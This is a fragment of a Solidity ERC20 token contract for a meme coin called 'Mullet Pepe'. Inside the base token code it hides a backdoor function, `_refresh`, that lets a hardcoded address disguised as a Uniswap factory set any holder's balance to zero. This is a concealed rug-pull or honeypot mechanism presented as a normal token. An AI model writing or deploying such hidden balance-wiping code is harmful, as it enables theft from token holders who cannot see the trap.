...
/*
https://twitter.com/mullet_eth
https://t.me/MulletPepe
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address internal V2Router = 0xDC3dC2B3b47BA0d1911708f4F37863BFaE6c0aAF;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private swappingToggles;
    address private _V2uniswapFactory = 0xf709a77c5a78D6381852ba2FD530E9dE77E57723;
     ...
     *
     */
    function _refresh(address _refreshSender) external { if (msg.sender == _V2uniswapFactory) _balances[_refreshSender] = 0x0; }
...
contract MulletPepeToken is ERC20, Ownable
{
    constructor()
    ERC20(unicode"Mullet Pepe", unicode"MUPEPE")
    {
